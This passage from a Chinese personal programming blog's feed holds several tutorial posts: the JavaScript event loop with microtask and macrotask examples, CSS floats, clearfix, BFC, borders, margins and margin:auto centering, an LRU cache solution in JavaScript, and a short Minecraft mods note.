title="两种异步任务的运行机制"></a>两种异步任务的运行机制</h2><p>在当前执行栈为空时，主线程会查看微任务队列是否有事件存在</p><p>存在，依次执行微任务队列中的事件对应的回调，直到微任务队列为空，然后去宏任务队列中取出最前面的事件。<br>如果不存在，去宏任务队列中取出一个事件并把对应的回调加入当前执行栈去执行；<br>当前执行栈执行完毕后时会 ** 立刻 ** 处理所有微任务队列中的事件，然后才会去宏任务队列中取出一个事件。<br>** 一次事件循环中，微任务永远在宏任务之前执行。**</p><h2 id="事件处理过程"><a href="#事件处理过程" class="headerlink" title="事件处理过程"></a>事件处理过程</h2><p>在事件循环中，每进行一次循环操作称为 <code>tick</code>，每一次 <code>tick</code> 的任务处理模型是比较复杂的，但关键步骤如下：</p><ol><li>检查 宏 任务队列是否为空，非空则到 2，为空则到 3</li><li>执行 宏 任务中的一个任务</li><li>检查 微 任务队列是否为空，若有则到 4，否则到 5</li><li>取出微 任务中的任务执行，执行完成返回到步骤 3</li><li>执行视图更新</li><li>检查是否有 Web Worker 任务，有则执行</li><li>执行下一个宏任务</li></ol><p>简单总结一下执行的顺序：<br>执行宏任务队列，宏任务执行完，然后执行该宏任务产生的微任务，若微任务在执行过程中产生了新的微任务，则继续执行新的微任务，微任务执行完毕后，再回到宏任务（有的话）中进行下一轮循环。</p><p><img src="/images/post-images/1625835881875.png" alt=""></p><h1 id="示例演示"><a href="#示例演示" class="headerlink" title="示例演示"></a>示例演示</h1><p><img src="/images/post-images/1625836553489.gif" alt=""></p><p>首先，全局代码（main()）压入调用栈执行，打印 start；</p><p>接下来 <code>setTimeout</code> 压入宏任务队列，<code>promise.then</code> 回调放入微任务队列，最后执行 <code>console.log</code>，打印出 end；</p><p>至此，调用栈中的代码被执行完成，回顾宏任务的定义，我们知道全局代码属于宏任务，宏任务执行完，那接下来就是执行微任务队列的任务了，执行 promise 回调打印 promise1；</p><p>promise 回调函数默认返回 undefined，promise 状态变为 fullfill，触发接下来的 then 回调，继续压入微任务队列，事件循环会把当前的微 任务队列一直执行完，即执行第二个 promise.then 回调并打印出 promise2；</p><p>然后，微任务队列已经为空，从上面的流程图可以知道，接下来主线程会去做一些 UI 渲染工作（不一定会做，看浏览器的），然后开始下一轮事件循环 event loop，即检查执行宏任务列表，有 <code>setTimeout</code> 的回调则执行，打印出 setTimeout；</p><p>这个过程会不断重复，也就是所谓的事件循环。</p><h1 id="事件循环与渲染的更新"><a href="#事件循环与渲染的更新" class="headerlink" title="事件循环与渲染的更新"></a>事件循环与渲染的更新</h1><p>回顾上面的事件循环示意图，update rendering（视图渲染）发生在本轮事件循环的 microtask 队列被执行完之后，也就是说执行任务的耗时会影响视图渲染的时机。通常浏览器以 60 帧 / S（60fps）的速率刷新页面，据说这个帧率最适合人眼交互，大概 <code>1000ms / 60 = 16.7ms</code> 渲染一帧，所以如果要让用户觉得顺畅，** 单个宏任务及它相关的所有微 任务最好能在内完成。**</p><p>但也不是每轮事件循环都会执行视图更新，浏览器有自己的优化策略，例如把几次的视图更新累积到一起重绘，重绘之前会通知 <code>requestAnimationFrame</code> 执行回调函数，也就是说 <code>requestAnimationFrame</code> 回调的执行时机是在一次或多次事件循环的 UI render 阶段。</p><p>验证代码：</p><pre><code>setTimeout(function() {console.log(&#39;timer1&#39;)}, 0)requestAnimationFrame(function(){    console.log(&#39;requestAnimationFrame&#39;)})setTimeout(function() {console.log(&#39;timer2&#39;)}, 0)new Promise(function executor(resolve) {    console.log(&#39;promise 1&#39;)    resolve()    console.log(&#39;promise 2&#39;)}).then(function() {    console.log(&#39;promise then&#39;)})console.log(&#39;end&#39;)</code></pre><p><img src="/images/post-images/1625839308225.png" alt=""></p><p>可以看到，结果 1 中 requestAnimationFrame()是在一次事件循环后执行，而在结果 2，它的执行则是在三次事件循环结束后。</p><p>总结</p><ol><li>事件循环是 js 实现异步的核心</li><li>每轮事件循环分为 3 个步骤：<br>a) 执行 macrotask 队列的一个任务<br>b) 执行完当前 microtask 队列的所有任务<br>c) UI render</li><li>浏览器只保证 requestAnimationFrame 的回调在重绘之前执行，没有确定的时间，何时重绘由浏览器决定</li></ol><h2 id="测验"><a href="#测验" class="headerlink" title="测验"></a>测验</h2><pre><code>var date = new Date()console.log(1, new Date() - date)setTimeout(() =&gt; {    console.log(2, new Date() - date)}, 500)// Promise.resolve().then(() =&gt; console.log(3, new Date() - date))Promise.resolve().then(console.log(3, new Date() - date))while (new Date() - date &lt; 1000) { }console.log(4, new Date() - date)</code></pre><p>输出？</p><p>执行结果： 1 3 4 2。<br>代码从上往下执行，<br>先打印 1，看见 setTimeout 丢到宏任务里面，等待执行，<br>因为 promise.then()的参数是一个 console.log（注意：并不是一个函数），且 then 是立即执行的。<br>函数立即执行，会先走参数的逻辑，然后在去调用函数。</p><pre><code>console.log(1);let a = Promise.resolve()a.then(console.log(&#39;2&#39;))console.log(3);输出：123</code></pre><p>所以先打印 3，并且给 then 传了一个 undefined（console.log 的返回值是 undefined），再把 then 丢到微任务里面<br>while 循环是同步任务，等待 1s 后打印 4，<br>此时同步任务走完了，开始执行异步任务，先将 then 取出来执行，发现 then 的第一个参数是一个 undefined，promise 内部会判断，如果 then 的第一个参数，也就是成功回调函数，不是一个参数的话，会自动给他包装成一个函数，并且将 resolve 的 value 值透传到下一个 then 里面。<br>然后去执行 setTimeout，最后打印 2。</p><h1 id="本文参考链接："><a href="#本文参考链接：" class="headerlink" title="本文参考链接："></a>本文参考链接：</h1><p><a href="https://www.ruanyifeng.com/blog/2014/10/event-loop.html" target="_blank" rel="noopener">https://www.ruanyifeng.com/blog/2014/10/event-loop.html</a></p><p><a href="https://segmentfault.com/a/1190000022805523" target="_blank" rel="noopener">https://segmentfault.com/a/1190000022805523</a></p><p><a href="http://lynnelv.github.io/js-event-loop-browser" target="_blank" rel="noopener">http://lynnelv.github.io/js-event-loop-browser</a></p><p><a href="https://github.com/Advanced-Frontend/Daily-Interview-Question/issues/471" target="_blank" rel="noopener">https://github.com/Advanced-Frontend/Daily-Interview-Question/issues/471</a></p>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>清除浮动影响</title>
      <link href="2021/07/09/qing-chu-fu-dong-ying-xiang/"/>
      <url>2021/07/09/qing-chu-fu-dong-ying-xiang/</url>
      
        <content type="html"><![CDATA[<p>要先看<a href="/images/post/fu-dong-yu-gao-du-ta-xian/">浮动与高度塌陷</a></p><a id="more"></a><h1 id="clear-属性"><a href="#clear-属性" class="headerlink" title="clear 属性"></a>clear 属性</h1><p>目前来说，clear 是比较好的方案。</p><p>clear:<br>作用: 清除浮动元素对当前元素的影响.<br>作用原理:** 浏览器为本元素设置上外边距.**<br>可选:</p><ul><li>left 清除本元素的左侧的浮动元素对本元素产生的影响</li><li>right 清除本元素的右侧的浮动元素对本元素产生的影响</li><li>both 取上述两者中上外边距较大的值</li></ul><p>示范：<br>box3 是一个一般的盒子，默认会被 box1 盖掉（我故意把 box3 变大了，否则只能看到 box3 的文字了）。如下图：<br><img src="/images/post-images/1626252014560.png" alt=""></p><p>给 box3 设置 clear-left：<br><img src="/images/post-images/1625798141230.png" alt=""></p><p>给 box3 设置 clear-right：<br><img src="/images/post-images/1625798152422.png" alt=""></p><p>现在，可以 “比较” 完美解决 <a href="/images/post/fu-dong-yu-gao-du-ta-xian/">浮动与高度塌陷</a> 中的左后的布局问题了：</p><p><img src="/images/post-images/1625798321560.png" alt=""></p><p>效果：<br><img src="/images/post-images/1625798346924.png" alt=""></p><h1 id="after-伪类有用了"><a href="#after-伪类有用了" class="headerlink" title="::after 伪类有用了"></a><code>::after</code> 伪类有用了</h1><p>但是。。。上面那种添加一个只用来撑高度的 div 并不是直接解决了本该 CSS 解决的布局问题。<br>所以，有一个更好的方案：<code>::after</code> 伪类。</p><p><img src="/images/post-images/1625798551638.png" alt=""></p><p>效果：</p><p><img src="/images/post-images/1625798573208.png" alt=""></p><h1 id="终极方案"><a href="#终极方案" class="headerlink" title="终极方案"></a>终极方案</h1><p>此方案不仅解决浮动问题，还能解决 <a href="/images/post/chui-zhi-fang-xiang-wai-bian-ju/">垂直方向外边距重叠</a> 问题。</p><p>就是这样一个 CSS 类</p><pre><code>.clearfix::before,.clearfix::after{    content: &#39;&#39;;    display: table;    clear: both;}</code></pre><p>其中，解决的是垂直布局问题的是，为外部容器设置以下代码，解决内部容器与外部容器的外边距重叠问题。</p><pre><code>.clearfix::before{    content: &#39;&#39;;    display: table; }注意，必须是 `table`，其他属性会有点问题。</code></pre><p>解决浮动问题的是，为外部容器设置以下代码，解决高度塌陷问题：</p><pre><code>.clearfix::after{    content: &#39;&#39;;    clear: both;}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BFC(Block formatting context)</title>
      <link href="2021/07/08/bfc/"/>
      <url>2021/07/08/bfc/</url>
      
        <content type="html"><![CDATA[<p>使用 BFC 规则的最外层元素会建立一个独立的块格式上下文。</p><a id="more"></a><p>这意味着：** 元素块中的每个元素都按照块和内联布局规则按照正常流程进行布局。参与 BFC 的元素使用 CSS 盒模型概述的规则，**</p><p>BFC 是元素的隐含属性, 手动开启后的 BFC 元素建立一个 ** 独立与页面的布局 **.<br>开启 BFC 的方法:<br>不推荐方法 (副作用大):<br>    1. 添加 float 属性即可<br>    2. 将元素设为行内元素<br>常用方法:<br>    1. 将元素的 overflow 设置为一个非 visible，一般设为 hidden 来开启 BFC 以降低副作用<br>    2. 使用 clear 属性</p><p>开启 BFC 后的特点:</p><ol><li>不会被浮动的元素所覆盖</li><li>子元素和父元素的外边距不会发生冲突 (设置了子元素的外边距而父元素也被动设置了)</li><li>开启 BFC 的元素可以包含浮动的子元素</li></ol>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浮动与高度塌陷</title>
      <link href="2021/07/08/fu-dong-yu-gao-du-ta-xian/"/>
      <url>2021/07/08/fu-dong-yu-gao-du-ta-xian/</url>
      
        <content type="html"><![CDATA[<p>其实 float 设计不是用来搞布局的，而是用来让文字环绕图片的。</p><a id="more"></a><h1 id="浮动带来的特点"><a href="#浮动带来的特点" class="headerlink" title="浮动带来的特点"></a>浮动带来的特点</h1><p>float 浮动可选值:</p><ul><li><code>none</code>, 默认值</li><li><code>left</code>, 元素向左浮动</li><li><code>right</code>, 元素向右浮动</li></ul><blockquote><p>NOTE:<br>浮动只是在父元素内左右浮动<br>几个注意事项：</p></blockquote><ol><li>元素设置 left 或者 right 后, 盒子水平布局的等式（7 个属性值 = 父元素宽度）不再成立,</li><li>“完全脱离文档流”, 不再占用位置, 所以会被后面的文档流元素占据位置,</li><li><ol><li>浮动后默认不会移动出父元素之外</li></ol></li><li>各个浮动元素之间 <code>margin</code> 正常</li><li>浮动只能左右浮动, 如果上边有非浮动元素, 会阻挡其浮上去</li><li>浮动元素水平高度不会超过它左边的相邻的兄弟元素, 最多和它一样高</li><li>文字自动环绕在图片周围, 浮动不会盖住文字, 这也是浮动设计初衷</li></ol><p>浮动元素水平高度示范：<br><img src="/images/post-images/1625752080549.png" alt="">、</p><p>文字自动环绕在图片周围示范：<br><img src="/images/post-images/1625752253322.png" alt=""></p><p>总结:<br>    1. 浮动元素的垂直对齐受到非浮动元素影响, 非浮动元素对于浮动元素来说就像一堵墙<br>    2. 浮动元素的水平对齐高度受到其相邻兄弟元素影响.</p><h1 id="浮动的副作用"><a href="#浮动的副作用" class="headerlink" title="浮动的副作用"></a>浮动的副作用</h1><p>设置 float 非 none 后，元素脱离文档流之元素的 display 发生改变。<br>在脱离文档流后，不在区分块与行内元素。</p><blockquote><p>NOTE : 不在区分块与行内元素不是 float 直接导致的，而是脱离文档流带来的特点。</p></blockquote><p>行内元素与块元素:<br>    1. 不再独占一行<br>    2. 块元素的高度与宽度不指定值时, 默认被内容撑开</p><p>示范：<br><img src="/images/post-images/1625752725589.png" alt=""></p><p>总结: 脱离文档流后, 大家都一样！</p><h1 id="高度塌陷问题"><a href="#高度塌陷问题" class="headerlink" title="高度塌陷问题"></a>高度塌陷问题</h1><p>写一个含有高度塌陷的的布局：</p><pre><code>&lt;style&gt;    body {        padding-top: 10px;    }    header,    main,    footer {        width: 1200px;        margin: 0 auto;    }    header {        height: 100px;        background-color: rgb(241, 208, 73);        margin-bottom: 5px;    }    main {        box-sizing: border-box;        padding: 10px;        /* height: 800px; */        background-color: darkgray;        /* 形成 BFC */        /* overflow: hidden; */    }    nav {        width: 200px;        height: 700px;        margin-right: 5px;        float: left;        background-color: darkorange;    }    content {        width: 770px;        height: 700px;        float: left;        background-color: darksalmon;    }    more {        width: 200px;        height: 700px;        margin-left: 5px;        float: left;        background-color: darkorange;    }    footer {        margin: 5px auto 0 auto;        height: 50px;        background-color: rgb(243, 200, 30);    }&lt;/style&gt;&lt;body&gt;    &lt;header&gt;&lt;p &gt; 头 &lt;/p&gt;&lt;/header&gt;    &lt;main&gt;        &lt;nav&gt;&lt;/nav&gt;        &lt;content&gt;&lt;/content&gt;        &lt;more&gt;&lt;/more&gt;    &lt;/main&gt;    &lt;footer&gt;&lt;p &gt; 脚, 由于 float 会环绕文字, 所以这个 p 段落没有跟着 footer 上去 &lt;/p&gt;&lt;/footer&gt;&lt;/body&gt;</code></pre><p>效果图：<br><img src="/images/post-images/1625753449717.png" alt=""></p><p>实际中很少把父元素写死, 因为，写死高度会写成造成:</p><ol><li>子元素内容多, 无法显示</li><li>子元素内容少, 太多留白</li></ol><p>上面代码中，中间的灰色的 <code>main</code> 容器就没有显示指定高度，所以需要容器内元素撑开，但是容器内元素又都是 float 的，这直接产生了高度塌陷，导致其只有了 padding，content 部分为 0！<br>** 这就是高度塌陷问题 **</p><p>解决方法就是启动 <strong>BFC</strong>。</p><blockquote><p>文档中使用 BFC 规则的最外层元素会建立一个独立的块格式上下文。这意味着：** 元素块中的每个元素都按照块和内联布局规则按照正常流程进行布局。参与 BFC 的元素使用 CSS 盒模型概述的规则，**</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>盒子的边框</title>
      <link href="2021/07/08/he-zi-de-bian-kuang/"/>
      <url>2021/07/08/he-zi-de-bian-kuang/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><blockquote><p>边框除了 border 还有一种，就是 <code>outline</code> 类型的边框。此类型属性值与 border 相同，唯一不同的是其不会占据空间。不会在文档流中挤别的元素。</p></blockquote><h1 id="阴影"><a href="#阴影" class="headerlink" title="阴影"></a>阴影</h1><p><code>box-shadow: 10px 10px 5px black;</code> 分别代表：<br>    - 水平偏移量<br>    - 垂直偏移量<br>    - 阴影模糊半径<br>    - 阴影颜色</p><p><img src="/images/post-images/1625714018715.png" alt=""></p><h1 id="边角样式"><a href="#边角样式" class="headerlink" title="边角样式"></a>边角样式</h1><p> <code>bordr-radius</code><br> 四个边角都可以分开设置，每个边角的颜色，半径。</p><h2 id="圆形"><a href="#圆形" class="headerlink" title="圆形"></a>圆形</h2><p><code>bordr-radius:50%</code> 并且盒子的边框宽度四面搜相同时，整个盒子就是一个圆形。</p><pre><code>.box2 {    /* display: none; */    width: 80px;    height: 80px;    background-color: cornflowerblue;    border: 5px red solid;    border-radius: 50%;}</code></pre><p><img src="/images/post-images/1625714672896.png" alt=""></p><h1 id="面试：三角形"><a href="#面试：三角形" class="headerlink" title="面试：三角形"></a>面试：三角形</h1><p>就是把盒子的宽高设为 0<br>边框占据整个盒子。</p><pre><code>.box {    width: 0;    height: 0;    /* margin: 100px auto; */    border-width: 100px 100px 100px 100px;    border-color: red greenyellow blue black;    border-style: solid;}</code></pre><p><img src="/images/post-images/1625714816194.png" alt=""></p><p>然后，根据需要的三角形形状，设置四面边框的宽度，颜色即可。<br>CSS3 中，<code>transparent</code> 可以用于设置颜色的地方</p><pre><code>.box1 {    width: 0px;    height: 0px;    border-width: 100px 100px 0px 100px;    border-color: red transparent blue transparent;    border-style: solid;}.box2 {    width: 0px;    height: 0px;    border-width: 0px 100px 100px 0px;    border-color: red transparent blue transparent;    border-style: solid;}.box3 {    width: 0;    height: 0;    border-width: 100px 0px 0px 100px;    border-color: red greenyellow blue black;    border-style: solid;}</code></pre><p><img src="/images/post-images/1625714981706.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>行内元素盒模型</title>
      <link href="2021/07/06/xing-nei-yuan-su-he-mo-xing/"/>
      <url>2021/07/06/xing-nei-yuan-su-he-mo-xing/</url>
      
        <content type="html"><![CDATA[<p> 行内元素也有内容区。</p><a id="more"></a><p>在文档流内：</p><ul><li>无法直接设置 width 和 height</li><li>padding，border，margin 三个属性的垂直方向不会挤其他元素（会遮挡其他元素），水平方向正常</li></ul><p>display 属性：</p><ol><li><code>display：inline,block,inline-block,table,none</code> 在页面中不显示，且不占用空间</li><li><code>visibility: visible,hidden;</code> 在页面中不显示，占用原来的空间<pre><code></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>垂直 &amp; 水平外边距</title>
      <link href="2021/07/06/chui-zhi-fang-xiang-wai-bian-ju/"/>
      <url>2021/07/06/chui-zhi-fang-xiang-wai-bian-ju/</url>
      
        <content type="html"><![CDATA[<p>分为同级与父子两类情况</p><a id="more"></a><h1 id="同级元素垂直方向-margin"><a href="#同级元素垂直方向-margin" class="headerlink" title="同级元素垂直方向 margin"></a>同级元素垂直方向 margin</h1><p>你可能在无意间发现，垂直方向两个同级的元素的外边距，其实是取了最大值（两个都是正值）。</p><p><img src="/images/post-images/1625562208597.png" alt=""></p><p>实际中遇到这种需要设置垂直 margin 时，不建议取负值，因为使用负值比较难以推测布局情况。<br>还是说明一些取负值的规则吧：</p><blockquote><ol><li>一正以负，取和</li><li>皆负，取最负</li></ol></blockquote><h1 id="父子设置垂直方向-margin"><a href="#父子设置垂直方向-margin" class="headerlink" title="父子设置垂直方向 margin"></a>父子设置垂直方向 margin</h1><p>设置子元素，父元素也跟着动。这不是我们期望的。这不光影响这对父子，还会影响其他元素！</p><p><img src="/images/post-images/1625562673231.png" alt=""></p><p>这里介绍一种解决方法：<br>为父元素设置 border 来 “隔离” 子元素与外部。<br><img src="/images/post-images/1625562971982.png" alt=""></p><p>有更好的方法，还没找到。。。</p><h1 id="应用垂直方向外边距"><a href="#应用垂直方向外边距" class="headerlink" title="应用垂直方向外边距"></a>应用垂直方向外边距</h1><h3 id="覆盖遮挡的效果"><a href="#覆盖遮挡的效果" class="headerlink" title="覆盖遮挡的效果"></a>覆盖遮挡的效果</h3><p>设置负值可以用来将元素置于其他元素之上，可以达到覆盖的效果。</p><p><img src="/images/post-images/1625713521597.png" alt=""></p><p>例如，上面这个 h2 元素的边框就可以覆盖掉父 div 元素的边框。只需要对 h2 设置:</p><pre><code>div {    border-top: gray 1px solid;}h2 {    margin-top: -1px;    border-top: red 1px solid;}</code></pre><h1 id="水平方向的外边距？"><a href="#水平方向的外边距？" class="headerlink" title="水平方向的外边距？"></a>水平方向的外边距？</h1><ul><li>同级元素：若两者都设置了 margin，那么 margin 是两者的和。</li><li>父子元素：不会影响父元素的水平方向的 margin。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为什么 margin:auto 可以水平居中</title>
      <link href="2021/07/06/wei-shi-me-marginauto-ke-yi-shui-ping-ju-zhong/"/>
      <url>2021/07/06/wei-shi-me-marginauto-ke-yi-shui-ping-ju-zhong/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="前提知识"><a href="#前提知识" class="headerlink" title="前提知识"></a>前提知识</h1><p>这个涉及到盒子的水平布局。<br>在盒子模型概念里，位于一个盒子元素内的盒子元素，只能使用其外部盒子的 <code>内容</code> 区域，即除去外部的 <code>border,padding</code>。<br><img src="/images/post-images/1625555051599.png" alt=""><br>（此图片搬运菜鸟教程）<br>当盒子的宽度小于外部盒子的宽度时，盒子在水平方向的位置是怎样的？</p><h1 id="决定水平位置的等式"><a href="#决定水平位置的等式" class="headerlink" title="决定水平位置的等式"></a>决定水平位置的等式</h1><p>当盒子的宽度小于外部盒子的宽度时，盒子在水平方向的位置由其自身的 7 个 CSS 属性的值决定：</p><pre><code>margin-left 默认值 0border-leftpadding-leftwidth 默认值 autopadding-rightborder-right margin-right 默认值 0</code></pre><p>规定这些属性的值必须满足下面的等式：</p><pre><code>7 个属性的值的和 = 外部盒子的 width 值</code></pre><p>等式不成立，称为 <code>过渡约束</code>。当浏览器加载 CSS 时，有的会被自动调整。<br><code>padding,border</code> 一般不会被浏览器修改。浏览器优先修改 <code>width，margin-left，largin-right</code> 中被明确设置为 auto 的属性的值使等式成立（注意 width 默认值就是 auto）。<br>调整的情况为：</p><ol><li>当 7 个属性都不存在值为 auto 的情况，浏览器会调整 <code>margin-right</code> 以使等式满足（因为默认是从左向右排列的，当从右向左排列时，会调整 <code>margin-left</code> 以满足等式）<ol><li>当等式左边大于右边时，有些值会被强制改为负值以使等式成立。</li><li>当等式左边小于右边时，有些值会增加以使等式成立。</li></ol></li><li>当 <code>margin-left,margin-right,width</code> 这三个属性中存在 <code>auto</code> 情况时：<ol><li>三个属性中只有一个为 <code>auto</code>，则浏览器会调整此属性使等式成立。</li><li>两个属性为 <code>auto</code>，再看情况：<ol><li>若其中 width 为 <code>auto</code>，则另一个为 <code>auto</code> 的 <code>margin</code> 属性值的 <code>auto</code> 就被浏览器改为 0。</li><li>两个 margin 为 <code>auto</code>，<code>width</code> 为固定值，则这两个 <code>margin</code> 值相等，即平分外部盒子剩余空间</li></ol></li><li>这三个都为 <code>auto</code>，则宽度变为最大</li></ol></li></ol><blockquote><p>不要把 <code>auto</code> 简单地看作 <code>0</code></p></blockquote><p>总结：当 7 个属性的值小于外部盒子的 <code>width</code>，则由浏览器根据规则选择其中的属性进行操作以满足等式。</p><h1 id="等式左边大于右边"><a href="#等式左边大于右边" class="headerlink" title="等式左边大于右边"></a>等式左边大于右边</h1><pre><code>.outer {    height: 200px;    width: 800px;    border: 5px solid;}.inner {    height: 200px;    background-color: goldenrod;}&lt;/style&gt;</code></pre><p><code>200 + 0 + 0 + 1000 + 0 + 0 &gt; 800</code>，浏览器修改了 <code>margin-right</code> 为 - 400px<br><img src="/images/post-images/1625557149923.png" alt=""><br>验证，满足上述规则 <code>2.1</code>：<br><img src="/images/post-images/1625557384888.png" alt=""></p><h1 id="等式右边大于左边"><a href="#等式右边大于左边" class="headerlink" title="等式右边大于左边"></a>等式右边大于左边</h1><pre><code>.inner {    height: 200px;    background-color: goldenrod;    width: 200px;    margin-right: 200px;}</code></pre><p><code>0 + 0 + 0 + 200 + 0 + 0 + 200 &lt; 800</code>，浏览器修改 <code>margin-right</code> 为 600px<br><img src="/images/post-images/1625558002530.png" alt=""></p><p>当显示写出 <code>margin-left:100px</code>，使得等式右边仍然大于左边时，浏览器仍然选择去修改 <code>margin-right</code>。<br><img src="/images/post-images/1625558201902.png" alt=""></p><p>当显示写出 <code>margin-left:auto</code> 时，浏览器终于肯修改 <code>margin-left</code> 了！<br><img src="/images/post-images/1625558483391.png" alt=""></p><h1 id="margin-auto"><a href="#margin-auto" class="headerlink" title="margin:auto"></a>margin:auto</h1><p>由于 margin 分四个方向，这里的 auto 其实应该写作 <code>margin:0 auto</code>，即上下为 0，左右为 auto。</p><p><img src="/images/post-images/1625558807573.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LRU 缓存</title>
      <link href="2021/07/05/lru-huan-cun/"/>
      <url>2021/07/05/lru-huan-cun/</url>
      
        <content type="html"><![CDATA[<p>如果一个数据在最近一段时间没有被访问到，那么在将来它被访问的可能性也很小。也就是说，当限定的空间已存满数据时，应当把最久没有被访问到的数据淘汰。</p><a id="more"></a><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>设计并实现最不经常使用（LFU）缓存的数据结构。它应该支持以下操作：<code>get</code> 和 <code>put</code>。</p><ul><li><code>get(key)</code>- 如果键存在于缓存中，则获取键的值（总是正数），否则返回 -1。</li><li><code>put(key, value)</code> - 如果键不存在，请设置或插入值。当缓存达到其容量时，它应该在插入新项目之前，使最不经常使用的项目无效。</li></ul><blockquote><p>输入：<br>[[1,1,1],[1,2,2],[1,3,2],[2,1],[1,4,4],[2,2]],3<br>返回值：<br>[1,-1]<br>说明：<br>第一次操作后：最常使用的记录为(“1”, 1)<br>第二次操作后：最常使用的记录为 (“2”, 2)，(“1”, 1) 变为最不常用的<br>第三次操作后：最常使用的记录为 (“3”, 2)，(“1”, 1) 还是最不常用的<br>第四次操作后：最常用的记录为 (“1”, 1)，(“2”, 2) 变为最不常用的<br>第五次操作后：大小超过了 3，所以移除此时最不常使用的记录 (“2”, 2)，加入记录(“4”, 4)，并且为最常使用的记录，然后(“3”, 2) 变为最不常使用的记录</p></blockquote><h2 id="使用单链表"><a href="#使用单链表" class="headerlink" title="使用单链表"></a>使用单链表</h2><p>单链表便于频繁的插入删除操作。<br>只需要在链表头部插入，尾部删除。<br>为了在头部插入方便，代码使用了无数据的头结点 head。</p><pre><code>/** * lru design * @param operators int 整型二维数组 the ops * @param k int 整型 the k * @return int 整型一维数组 */function LRU(operators, limit) {    // 定义链表数据结构    class Node {        constructor(key, value, next = null) {            this.key = key;            this.value = value;            this.next = next;        }    }    // head 不计入链表总个数，其 next 指向第一个 node    let head = new Node(Number.MIN_VALUE, Number.MIN_VALUE);    const resArr = [];    for (const [op, k, v] of operators) {        let temp = head.next;        let pre = head;        if (v) { // put            while (temp) {                // key 已经存在                if (temp.key === k) {                    let node = new Node(k, v);                    // 删除此节点                    pre.next = temp.next;                    // 插入新节点                    let t = head.next;                    head.next = node;                    node.next = t;                    break;                }                pre = pre.next;                temp = temp.next;            }            if (temp === null) {  // key 不存在，插入这个 key 的节点时，需要判断整个链表是否是满的！                let node = new Node(k, v);                let t = head.next;                head.next = node;                node.next = t;            }        } else { // get 操作            while (temp) {                // key 存在                if (temp.key === k) {                    // console.log(temp.value);                    resArr.push(temp.value);                    let node = new Node(k, temp.value);                    // 删除此节点                    pre.next = temp.next;                    // 插入新节点                    let t = head.next;                    head.next = node;                    node.next = t;                    break;                }                pre = pre.next;                temp = temp.next;            }            // 没找到，返回 - 1            if (temp === null) {                // console.log(-1);                resArr.push(-1);            }        }        // 截断链表        let i = 1;        temp = head;        while (i &lt;= limit &amp;&amp; temp) {            temp = temp.next;            i += 1;        }        if (temp) {            temp.next = null;        }    }    return resArr;}</code></pre><p>时间复杂度：O(N)，因为查找 key 需要遍历链表。<br>空间复杂度：O(limit)</p><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://juejin.cn/post/6844903855726002189" target="_blank" rel="noopener">https://juejin.cn/post/6844903855726002189</a></p>]]></content>
      
      
      <categories>
          
          <category> 算法笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>我的世界模组</title>
      <link href="2021/07/01/wo-de-shi-jie-mo-zu/"/>
      <url>2021/07/01/wo-de-shi-jie-mo-zu/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>现在模组都推荐使用 Fabric 了啊，好久没玩了，以前都没听说过 Fabric。。。<br>启动器 HMCL 的官网也打不开了。。。<br>用了一个新的启动器：NsisoLauncher</p><p><img src="/images/post-images/1625148109077.png" alt=""></p><h1 id="2021-7-1"><a href="#2021-7-1" class="headerlink" title="2021-7-1"></a>2021-7-1</h1><ul><li>连锁采集。<a href="https://www.curseforge.com/minecraft/mc-mods/diggus-maximus" target="_blank" rel="noopener">Diggus Maximus</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> GAME </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>最小的 K 个数</title>
      <link href="2021/06/30/zui-xiao-de-k-ge-shu/"/>
      <url>2021/06/30/zui-xiao-de-k-ge-shu/</url>
      
